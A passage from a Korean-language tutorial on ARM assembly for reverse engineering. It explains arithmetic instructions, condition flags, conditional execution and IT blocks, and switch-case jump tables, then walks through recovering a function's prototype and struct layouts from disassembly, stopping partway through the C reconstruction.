<p>기초적인 산술 및 논리 연산 인스트럭션으로는 <code>ADD</code> , <code>SUB</code> , <code>MUL</code> , <code>AND</code> , <code>ORR</code> , <code>EOR</code> 이 있습니다. 다음 예제에서 일부 인스트럭션에는 <code>S</code> 접미사가 붙어 있는데, 산술 연산의 결과에 따라 <code>CPSR</code> 레지스터의 플래그(e.g. zero 비트, negative 비트)를 갱신해야 함을 의미합니다.</p>
<ul>
<li>x86/64와는 달리, ARM 산술 인스트럭션은 기본적으로 <code>CPSR</code> 을 갱신하지 않습니다.</li>
</ul>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ADD</span> <span class="built_in">R3</span>, <span class="built_in">R9</span>              <span class="comment">; R3 = R3 + R9</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#8</span>         <span class="comment">; R11 = SP + 8</span></span><br><span class="line"><span class="keyword">ADD</span> <span class="built_in">R0</span>, <span class="built_in">R4</span>, <span class="keyword">LSL</span> <span class="number">#2</span>      <span class="comment">; R0 = (R4 &lt;&lt; 2)</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">SP</span>, <span class="built_in">SP</span>, <span class="number">#0x1a8</span>      <span class="comment">; SP = SP - 0x1a8</span></span><br><span class="line"><span class="keyword">MUL</span> <span class="built_in">R2</span>, <span class="built_in">R3</span>, <span class="built_in">R5</span>          <span class="comment">; R2 = R3 * R5 (결과의 하위 32비트만 저장됩니다)</span></span><br><span class="line"><span class="keyword">ANDS</span> <span class="built_in">R2</span>, <span class="built_in">R4</span>, <span class="number">#7</span>         <span class="comment">; R2 = R4 &amp; 7 (CPSR을 갱신합니다)</span></span><br><span class="line"><span class="keyword">EOR</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="keyword">LSL</span> <span class="number">#3</span>  <span class="comment">; R3 = R3 ^ (R1 &lt;&lt; 3)</span></span><br><span class="line"><span class="keyword">EORS</span> <span class="built_in">R3</span>, <span class="built_in">R2</span>             <span class="comment">; R3 = R3 ^ R2 (CPSR을 갱신합니다)</span></span><br><span class="line"><span class="keyword">ORR</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R2</span>, <span class="keyword">LSL</span> <span class="number">#8</span>  <span class="comment">; R3 = R3 | (R2 &lt;&lt; 8)</span></span><br><span class="line"><span class="keyword">ORRS</span> <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#2</span>         <span class="comment">; R3 = R3 | 2 (CPSR을 갱신합니다)</span></span><br><span class="line"><span class="keyword">ORRS</span> <span class="built_in">R3</span>, <span class="built_in">R2</span>             <span class="comment">; R3 = R3 | R2 (CPSR을 갱신합니다)</span></span><br></pre></td></tr></table></figure>
<p><code>MUL</code> 인스트럭션은 결과의 하위 32비트만이 목적지 레지스터에 저장되며, 64비트 값 전체가 필요한 경우 <code>SMULL</code> , <code>UMALL</code> 인스트럭션을 사용해야 합니다. 또한 나눗셈 인스트럭션이 존재하지 않는데, (ARMv7-R과 ARMv7-M에 <code>SDIV</code> , <code>UDIV</code> 인스트럭션이 있기는 합니다) 실제로는 나눗셈을 소프트웨어적으로 구현하여 필요한 경우 호출하도록 합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R6</span></span><br><span class="line"><span class="keyword">BL</span> __rt_udiv            <span class="comment">; 소프트웨어적으로 구현한 나눗셈 함수</span></span><br></pre></td></tr></table></figure>
<h2 id="%EC%A1%B0%EA%B1%B4%EB%B6%80-%EB%B6%84%EA%B8%B0%EC%99%80-%EC%8B%A4%ED%96%89" tabindex="-1">조건부 분기와 실행</h2>
<p>반복문과 조건문애서 사용되는 조건부 분기는 <code>CPSR</code> 레지스터에서 다음과 같은 플래그들을 사용합니다.</p>
<ul>
<li><code>N</code> (negative flag) - 결과가 음수인 경우 (최상위 비트가 1인 경우) 1입니다.</li>
<li><code>Z</code> (zero flag) - 결과가 0이면 1입니다.</li>
<li><code>C</code> (carry flag) - 부호가 없는 연산의 결과 오버플로우가 발생하면 1입니다.</li>
<li><code>V</code> (overflow flag) - 부호가 있는 연산의 결과 오버플로우가 발생하면 1입니다.</li>
<li><code>IT</code> (if-then bits) - Thumb 상태의 <code>IT</code> 인스트럭션에서 조건부 분기의 조건들에 해당하는데, 뒤에서 자세히 설명합니다.</li>
</ul>
<p>인스트럭션은 다음과 같이 조건을 나타내는 접미사 중 하나를 붙여 조건부로 실행할 수 있습니다.</p>
<ul>
<li>e.g. <code>BLT</code> 는 아래 표에서 <code>LT</code> 조건이 참인 경우에만 분기하라는 의미로, x86/64에서의 <code>JL</code> 과 같습니다.</li>
</ul>
<table>
<thead>
<tr>
<th>접미사</th>
<th>의미</th>
<th>플래그</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>EQ</code></td>
<td>Equal</td>
<td><code>Z == 1</code></td>
</tr>
<tr>
<td><code>NE</code></td>
<td>Not equal</td>
<td><code>Z == 0</code></td>
</tr>
<tr>
<td><code>MI</code></td>
<td>Minus, negative</td>
<td><code>N == 1</code></td>
</tr>
<tr>
<td><code>PL</code></td>
<td>Plus, positive or zero</td>
<td><code>N == 0</code></td>
</tr>
<tr>
<td><code>HI</code></td>
<td>Unsigned higher/above</td>
<td><code>C == 1</code> and <code>Z == 0</code></td>
</tr>
<tr>
<td><code>LS</code></td>
<td>Unsigned lower/below</td>
<td><code>C == 0</code> or <code>Z == 1</code></td>
</tr>
<tr>
<td><code>GE</code></td>
<td>Signed greater than or equal</td>
<td><code>N == V</code></td>
</tr>
<tr>
<td><code>LT</code></td>
<td>Signed less than</td>
<td><code>N != V</code></td>
</tr>
<tr>
<td><code>GT</code></td>
<td>Signed greater than</td>
<td><code>Z == 0</code> and <code>N == V</code></td>
</tr>
<tr>
<td><code>LE</code></td>
<td>Signed less than or equal</td>
<td><code>Z == 1</code> or <code>N != V</code></td>
</tr>
</tbody>
</table>
<p>비교를 위한 인스트럭션으로 <code>CBZ</code> , <code>CMP</code> , <code>TST</code> , <code>CMN</code> , <code>TEQ</code> 가 있으며, 비교 인스트럭션은 기본값으로 <code>CPSR</code> 을 갱신하지 않는 다른 인스트럭션과 달리 <code>CPSR</code> 의 플래그들을 자동으로 갱신합니다.</p>
<p>가장 흔한 비교 인스트럭션은 <code>CMP</code> 로, <code>Rn</code> 은 레지스터이고 <code>Operand2</code> 는 상수, 레지스터의 값 또는 레지스터의 값에 배럴 시프터를 사용한 값입니다. <code>CMP</code> 는 x86/64에서와 같이 <code>Rn - Operand2</code> 를 연산하고, <code>CPSR</code> 을 갱신한 후 결과를 버립니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span> Rn, Operand2</span><br></pre></td></tr></table></figure>
<p>다음 여러 블록이 있는 조건문에서 조건 분기가 사용되는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">CMP.W</span> <span class="built_in">R3</span>, <span class="built_in">R7</span>, <span class="keyword">ASR</span> <span class="number">#31</span></span><br><span class="line"><span class="keyword">BLT</span> loc_less</span><br><span class="line"><span class="keyword">BGT</span> loc_greater</span><br><span class="line"><span class="keyword">CMP</span> <span class="built_in">R5</span>, <span class="built_in">R7</span></span><br><span class="line"><span class="keyword">BLS</span> loc_less</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_greater:</span></span><br><span class="line"><span class="keyword">SUBS</span> <span class="built_in">R5</span>, <span class="number">#7</span></span><br><span class="line"><span class="symbol">SBC.W</span> <span class="built_in">LR</span>, <span class="built_in">LR</span>, <span class="number">#0</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_less:</span></span><br><span class="line"><span class="symbol">UMULL.W</span> <span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R5</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">SMULL.W</span> <span class="built_in">R0</span>, <span class="built_in">R4</span>, <span class="built_in">R7</span>, <span class="built_in">R8</span></span><br><span class="line"><span class="symbol">MLA.W</span> <span class="built_in">R3</span>, <span class="built_in">LR</span>, <span class="built_in">R8</span>, <span class="built_in">R2</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (R3 &lt; R7) &#123; <span class="keyword">goto</span> loc_less; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (R3 &gt; R7) &#123; <span class="keyword">goto</span> loc_greater; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (R5 &lt; R7) &#123; <span class="keyword">goto</span> loc_less; &#125;</span><br></pre></td></tr></table></figure>
<p>다음으로 흔한 비교 인스트럭션은 <code>TST</code> 로, <code>CMP</code> 와 문법이 같습니다. 마찬가지로 x86/64의 <code>TEST</code> 와 같이 <code>Rn &amp; Operand2</code> 를 연산하고, <code>CPSR</code> 을 갱신한 후 결과를 버립니다. <code>TST</code> 는 주로 어떤 값이 다른 값과 동일한지, 또는 특정 플래그를 검사하기 위해 사용합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">TST</span> Rn, Operand2</span><br></pre></td></tr></table></figure>
<p>다음은 특정 비트를 검사하여 참인 경우 분기하는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDRH</span> <span class="built_in">R3</span>, [<span class="built_in">R5</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="symbol">TST.W</span> <span class="built_in">R3</span>, <span class="number">#2</span></span><br><span class="line"><span class="keyword">BEQ</span> loc_10179DA</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_10179BE:</span></span><br><span class="line"><span class="keyword">LDRH</span> <span class="built_in">R2</span>, [<span class="built_in">R5</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="symbol">TST.W</span> <span class="built_in">R2</span>, <span class="number">#4</span></span><br><span class="line"><span class="keyword">BEQ</span> loc_10179E8</span><br></pre></td></tr></table></figure>
<p><code>CBZ</code> 와 <code>CBNZ</code> 는 Thumb 상태에서 자주 쓰이는 비교 인스트럭션입니다. <code>CBZ</code> 는 레지스터 <code>Rn</code> 의 값이 0이면 <code>label</code> 로 분기하고, <code>CBNZ</code> 는 0이 아니면 분기합니다. 이들 인스트럭션은 주로 정수형 변수의 값이 0인지, 또는 포인터가 <code>NULL</code> 인지 검사하기 위해 사용합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CBZ</span> Rn, label</span><br><span class="line"><span class="keyword">CBNZ</span> Rn, label</span><br></pre></td></tr></table></figure>
<p>다음은 함수가 반환한 포인터가 <code>NULL</code> 인지 검사하는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BL</span> foo              <span class="comment">; 함수 foo는 포인터를 반환합니다.</span></span><br><span class="line"><span class="keyword">CBZ</span> <span class="built_in">R0</span>, loc_100BC8E</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_100BCE:</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#1</span></span><br><span class="line"><span class="keyword">B</span> locret_100BCE4</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">locret_100BCE4:</span></span><br><span class="line"><span class="symbol">POP.W</span> &#123;<span class="built_in">R3</span>-<span class="built_in">R8</span>,<span class="built_in">R11</span>,<span class="built_in">PC</span>&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a = foo(...);</span><br><span class="line"><span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br></pre></td></tr></table></figure>
<p>분기 인스트럭션 <code>B</code> 에 조건 접미사를 붙이면 (e.g. <code>BEQ</code> , <code>BLE</code> , <code>BLT</code> , <code>BLS</code>) 조건 분기를 수행합니다. 대부분의 ARM 인스트럭션에는 조건 접미사를 붙여 조건부 실행이 가능하며, 조건이 참이 아닌 경우 그 인스트럭션은 <code>NOP</code> 와 같이 취급합니다. 이러한 조건부 실행은 분기에 필요한 인스트럭션의 수를 줄이는 데 도움이 됩니다.</p>
<p>다음은 포인터가 <code>NULL</code> 이 아닌 경우 구조체의 특정 필드를 반환하는 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">MOVEQ</span> <span class="built_in">R0</span>, <span class="number">#1</span></span><br><span class="line"><span class="symbol">LDRNEB</span> <span class="built_in">R0</span>, [<span class="built_in">R0</span>,<span class="number">#0x48</span>]</span><br><span class="line"><span class="keyword">BX</span> <span class="built_in">LR</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">return</span> a-&gt;off_48; &#125;</span><br></pre></td></tr></table></figure>
<h3 id="thumb-%EC%83%81%ED%83%9C%EC%97%90%EC%84%9C%EC%9D%98-%EC%A1%B0%EA%B1%B4%EB%B6%80-%EC%8B%A4%ED%96%89" tabindex="-1">Thumb 상태에서의 조건부 실행</h3>
<p>Thumb 상태에서는 <code>IT</code> (if-then) 인스트럭션을 사용해야만 조건부 실행이 가능합니다. (<code>B</code> 는 예외입니다)</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">ITxyz</span> cc</span><br></pre></td></tr></table></figure>
<p><code>IT</code> 인스트럭션은 뒤따르는 최대 4개의 인스트럭션까지 조건부로 실행될 수 있도록 합니다. <code>cc</code> 는 첫째 인스트럭션의 실행 조건이며, <code>x</code> , <code>y</code> , <code>z</code> 는 각각 둘째, 셋째, 넷째 인스트럭션의 조건을 나타냅니다. 이 3개의 조건은 <code>T</code> 또는 <code>E</code> 로만 나타낼 수 있습니다.</p>
<ul>
<li><code>T</code> - <code>cc</code> 가 참이면 실행합니다.</li>
<li><code>E</code> - <code>cc</code> 가 거짓이면 실행합니다.</li>
</ul>
<p>다음은 if-else 블록을 <code>IT</code> 인스트럭션으로 작성한 예제입니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R3</span>, <span class="number">#0</span>          <span class="comment">; 비교 인스트럭션으로, CPSR을 갱신합니다.</span></span><br><span class="line"><span class="keyword">ITEE</span> NE             <span class="comment">; IT 블록을 시작합니다.</span></span><br><span class="line"><span class="symbol">CLZNE.W</span> <span class="built_in">R0</span>, <span class="built_in">R12</span>     <span class="comment">; 첫째 인스트럭션은 비교의 결과 NE 조건이 참이면 실행됩니다.</span></span><br><span class="line"><span class="symbol">CLZEQ.W</span> <span class="built_in">R0</span>, <span class="built_in">R6</span>      <span class="comment">; 둘째 인스트럭션은 NE 조건이 거짓이면 실행됩니다.</span></span><br><span class="line"><span class="keyword">ADDEQ</span> <span class="built_in">R0</span>, <span class="number">#0x20</span>     <span class="comment">; 셋째 인스트럭션은 NE 조건이 거짓이면 실행됩니다.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (R3 != <span class="number">0</span>) &#123;</span><br><span class="line">    R0 = countleadzeros(R12);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    R0 = countleadzeros(R6);</span><br><span class="line">    R0 += <span class="number">0x20</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="switch-case-%EA%B5%AC%EB%AC%B8" tabindex="-1">Switch-case 구문</h3>
<p>Switch-case 구문은 여러 묶음의 if-else 블록과 같습니다. 컴파일 시점에 각 case 블록의 위치를 알 수 있으므로, 컴파일러는 점프 테이블을 생성하여 switch-case 구문을 처리합니다. ARM 상태에서는 점프 테이블에 각 case 블록의 주소를, Thumb 상태에서는 블록의 오프셋을 저장합니다. 런타임에서는 점프 테이블을 읽고 목적지 주소를 <code>PC</code> 로 불러들이는 간접 분기(indirect branch)를 수행합니다.</p>
<p>다음은 ARM 상태에서 switch-case 구문의 예제입니다. ARM 상태에서 간접 분기는 <code>PC</code> 를 목적지 레지스터로 하는 <code>LDR</code> 인스트럭션을 사용합니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R1</span>, <span class="number">#0xb</span>                <span class="comment">; R1이 case인데, 점프 테이블의 범위 안에 있는지 확인합니다.</span></span><br><span class="line"><span class="keyword">LDRLS</span> <span class="built_in">PC</span> [<span class="built_in">PC</span>,<span class="built_in">R1</span>,LSL<span class="number">#2</span>]      <span class="comment">; 범위 안에 있으면 점프 테이블을 읽고 PC에 대입하여 분기합니다.</span></span><br><span class="line"><span class="keyword">B</span> loc_DD10                  <span class="comment">; 범위 안에 없으면 break합니다.</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C                <span class="comment">; 점프 테이블입니다.</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD4C</span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DCEC                <span class="comment">; 인덱스 8 (case 8에 해당)</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DCEC                <span class="comment">; 인덱스 9 (case 9에 해당)</span></span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C</span><br><span class="line"><span class="symbol">DCD</span> loc_DD3C</span><br><span class="line"></span><br><span class="line"><span class="symbol">loc_DCEC:</span>                   <span class="comment">; case 8, 9에 해당하는 코드 블록입니다.</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">SUB</span> <span class="built_in">R1</span>, <span class="built_in">R1</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R3</span>, <span class="number">#4</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R0</span>, [<span class="built_in">R2</span>,<span class="number">#0x14</span>]</span><br><span class="line"><span class="keyword">STRH</span> <span class="built_in">R3</span>, [<span class="built_in">R2</span>,<span class="number">#0x1c</span>]</span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R1</span>, [<span class="built_in">R2</span>,<span class="number">#0x10</span>]</span><br></pre></td></tr></table></figure>
<p>Thumb 상태에서는 점프 테이블에 case 블록의 주소가 아닌 오프셋을 보관합니다. 간접 분기는 특수한 인스트럭션 <code>TBB</code> 와 <code>TBH</code> 를 사용하는데, 점프 테이블의 값에 2를 곱하고 <code>PC</code> 에 더하여 case 블록의 주소를 얻습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CMP</span> <span class="built_in">R1</span>, <span class="number">#0xb</span>                <span class="comment">; R1이 case인데, 점프 테이블의 범위 안에 있는지 확인합니다.</span></span><br><span class="line"><span class="keyword">BHI</span> loc_101E6F2             <span class="comment">; 범위 안에 없으면 break합니다.</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R6</span>, <span class="number">#4</span></span><br><span class="line"><span class="symbol">TBB.W</span> [<span class="built_in">PC</span>,<span class="built_in">R1</span>]               <span class="comment">; 점프 테이블을 읽고 분기합니다.</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span>                       <span class="comment">; 점프 테이블입니다.</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0xf</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0x6d</span>                    <span class="comment">; 인덱스 8 (case 8에 해당)</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">0x6d</span>                    <span class="comment">; 인덱스 9 (case 9에 해당)</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span></span><br><span class="line"><span class="symbol">DCB</span> <span class="number">6</span></span><br><span class="line"><span class="comment">; ...</span></span><br><span class="line"><span class="symbol">loc_101E6E4:</span>                <span class="comment">; case 8, 9에 해당하는 코드 블록입니다.</span></span><br><span class="line"><span class="symbol">SUBS.W</span> <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="number">#8</span></span><br><span class="line"><span class="keyword">MOVS</span> <span class="built_in">R0</span>, <span class="number">#0</span></span><br><span class="line"><span class="keyword">STR</span> <span class="built_in">R0</span>, [<span class="built_in">R4</span>,<span class="number">#0x14</span>]</span><br></pre></td></tr></table></figure>
<h2 id="%EB%A6%AC%EB%B2%84%EC%8A%A4-%EC%97%94%EC%A7%80%EB%8B%88%EC%96%B4%EB%A7%81-%EC%97%B0%EC%8A%B5" tabindex="-1">리버스 엔지니어링 연습</h2>
<p>지금까지 살펴본 내용을 바탕으로, 예제 함수를 직접 리버스 엔지니어링해보면서 연습해 보겠습니다. 함수를 호출하는 코드는 다음과 같으며, 함수의 코드는 그래프로 나타내었습니다.</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R3</span>, [<span class="built_in">SP</span>,<span class="number">#0x5c</span>]</span><br><span class="line"><span class="keyword">LDR</span> <span class="built_in">R2</span>, [<span class="built_in">SP</span>,<span class="number">#0x58</span>]</span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R1</span>, <span class="built_in">R10</span></span><br><span class="line"><span class="keyword">MOV</span> <span class="built_in">R0</span>, <span class="built_in">R4</span></span><br><span class="line"><span class="keyword">BL</span> unk_function</span><br></pre></td></tr></table></figure>
<p><img src="/images/arm-1-introduction/6.png" alt="6.png"></p>
<p>다음은 함수의 코드를 보고 빠르게 확인할 수 있는 사실들입니다.</p>
<ul>
<li>함수는 최대 4개의 인자를 받고, 불리언형을 리턴합니다.
<ul>
<li>함수 호출 코드에서 <code>R0</code> , <code>R1</code> , <code>R2</code> , <code>R3</code> 에 값을 대입하고, 함수의 리턴 직전 <code>R0</code> 에 대입되는 값은 0 아니면 1이기 때문입니다</li>
</ul>
</li>
<li>첫번째, 두번째 인자는 구조체의 포인터라고 추측할 수 있습니다.
<ul>
<li>3행, 4행 등에서 <code>R0</code> 과 <code>R1</code> 이 <code>LDR</code> 인스트럭션의 베이스 주소로 사용되며, 상수 오프셋에 접근하고 있기 때문입니다.</li>
</ul>
</li>
<li>세번째, 네번째 인자의 자료형은 정수입니다.
<ul>
<li>14행, 15행에서 <code>AND</code> , <code>ORR</code> 연산의 인자로 사용되고 있기 때문입니다.</li>
</ul>
</li>
</ul>
<p>이를 바탕으로 함수의 프로토타입을 추측할 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *, struct2 *, <span class="type">int</span>, <span class="type">int</span>)</span></span><br></pre></td></tr></table></figure>
<p>다음으로는 식별된 구조체들의 형태를 살펴보겠습니다.</p>
<ul>
<li>3~6행에서 <code>struct1</code> 의 <code>[R0, #8]</code> 과 <code>struct2</code> 의 <code>[R1, #0x18]</code> 을 비교하고 있습니다.
<ul>
<li>두 필드는 동일한 타입이고, 정수형임을 추측할 수 있습니다.</li>
</ul>
</li>
<li>8행에서 <code>struct1</code> 의 <code>[R0, #0x10]</code> 을 읽고 2와 비교하는데, <code>LDRH</code> (load half word) 인스트럭션을 사용하고 있어 <code>short</code> 타입임을 알 수 있습니다.</li>
<li>11~14행에서 <code>struct1</code> 의 <code>[R0, #0x18]</code> . <code>[R0, #0x1c]</code> 을 읽고 각각 세번째, 네번째 인자와 <code>AND</code> 연산을 하고 있어 필드의 타입이 정수형임을 추측할 수 있습니다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct1</span> &#123;</span></span><br><span class="line">    unk8;          <span class="comment">// +0x8 ; struct2.unk18과 같은 타입</span></span><br><span class="line">    <span class="type">short</span> unk10;    <span class="comment">// +0x10</span></span><br><span class="line">    <span class="type">int</span> unk18;      <span class="comment">// +0x18</span></span><br><span class="line">    <span class="type">int</span> unk1c;      <span class="comment">// +0x1c</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct2</span> &#123;</span></span><br><span class="line">    unk18;          <span class="comment">// +0x18 ; struct1.unk8과 같은 타입</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>16행까지 분석한 내용을 C 코드로 나타내면 다음과 같습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *a1, struct2 *a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (a1.unk8 != s2.unk18</span><br><span class="line">        || a1.unk10 != <span class="number">2</span></span><br><span class="line">        || ((a1.unk18 &amp; a3) | (a1.unk1c &amp; a4)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>이후의 코드를 계속 분석해 보겠습니다.</p>
<ul>
<li>17행은 <code>struct1</code> 의 <code>[R0, #0xc]</code> 를 <code>R3</code> 에 대입하고, 18행은 <code>[R0]</code> 을 <code>R0</code> 에 대입합니다.</li>
<li>19행은 <code>R3 + (R3 &lt;&lt; 1)</code> 을 <code>R2</code> 에 대입하는데, 이는 곧 <code>R3 * 3</code> 입니다.</li>
<li>20행은 <code>struct2</code> 의  <code>[R1, #0xc]</code> 를 <code>R3</code> 에 대입하고, 21행은 다시 <code>[R3, #0xc]</code> 를 <code>R3</code> 에 대입합니다.
<ul>
<li><code>struct2</code> 의 오프셋 <code>0xc</code> 에 위치한 필드는 다른 구조체로의 포인터임을 추측할 수 있습니다.</li>
</ul>
</li>
<li>22행은 <code>R3 + R2 * 8</code> 을 <code>R3</code> 에 대입합니다.</li>
<li>23행은 <code>[R3, #0x16]</code> 의 바이트 값을 <code>LDRSB</code> 인스트럭션을 사용해 <code>R4</code> 에 대입합니다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct1</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> unk0;       <span class="comment">// +0x0</span></span><br><span class="line">    unk8;           <span class="comment">// +0x8 ; struct2.unk18과 같은 타입</span></span><br><span class="line">    <span class="type">int</span> unkc;       <span class="comment">// +0xc</span></span><br><span class="line">    <span class="type">short</span> unk10;    <span class="comment">// +0x10</span></span><br><span class="line">    <span class="type">int</span> unk18;      <span class="comment">// +0x18</span></span><br><span class="line">    <span class="type">int</span> unk1c;      <span class="comment">// +0x1c</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct2</span> &#123;</span></span><br><span class="line">    struct3 *unkc;  <span class="comment">// +0xc</span></span><br><span class="line">    unk18;          <span class="comment">// +0x18 ; struct1.unk8과 같은 타입</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct3</span> &#123;</span></span><br><span class="line">    struct4 *unkc;  <span class="comment">// +0xc;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">struct4</span> &#123;</span>    <span class="comment">// 크기 24바이트</span></span><br><span class="line">    <span class="type">char</span> unk16;     <span class="comment">// +0x16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>22행, 23행에서 레지스터 값의 정수배를 오프셋으로 사용하고 있어, 배열에 접근하고 있음을 추측할 수 있습니다.</li>
<li>배열의 베이스 주소는 20행의 <code>[R1, #0xc]</code> 이고, 오프셋으로 <code>R3 * 3 * 8</code> 을 연산함에서 크기가 24바이트인 <code>struct4</code> 구조체들의 배열임을 알 수 있습니다.
<ul>
<li>오프셋 계산에 사용된 <code>R3</code> 은 인덱스로, 17행에서 <code>[R0, #0xc]</code> 를 대입한 값입니다.</li>
</ul>
</li>
<li>18행, 24행에서 <code>[R0]</code> 을 인자로 <code>foo</code> 함수를 호출합니다. (<code>foo</code> 의 인자는 1개라고 가정합니다)</li>
</ul>
<p>나머지 코드는 <code>foo</code> 의 리턴값과 23행에서 대입한 <code>R4</code> 에 대한 단순 분기문들로, 분석한 내용을 C 코드에 추가하면 대강의 로직과 구조체 사이의 참조 관계를 파악할 수 있습니다.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">unk_function</span><span class="params">(struct1 *a1, struct2 *a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span> &#123;</span><br><span class="line">    <span class="type">char</span> v5;</span><br><span class="line">    <span class="type">int</span> v6;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a1.unk8 != s2.unk18</span><br><span class="line">        || a1.unk10 != <span class="number">2</span></span><br><span class="line">        || ((a1.unk18 &amp; a3) | (a1.unk1c &amp; a4)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    v5 = 